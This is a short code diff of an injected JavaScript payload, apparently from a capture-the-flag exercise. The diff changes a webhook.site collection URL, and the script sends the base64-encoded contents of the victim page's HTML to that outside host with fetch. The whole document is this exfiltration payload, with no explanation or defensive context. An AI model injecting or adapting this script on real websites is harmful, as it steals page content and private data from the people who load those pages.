@@ -5,7 +5,7 @@
     <script>
       <script>
   (async () => {
-    const hook = 'https://webhook.site/45e22f22-d768-4cb1-99e1-737dd37efb79';
+    const hook = 'https://webhook.site/4115b783-e812-47a6-b8fd-98a62d308137';
     try {
       // 1. Leak current page content (often contains flags in the UI)
       fetch(hook, {method:'POST', body: btoa('PAGE_HTML: ' + document.body.innerHTML.substring(0,1000))});
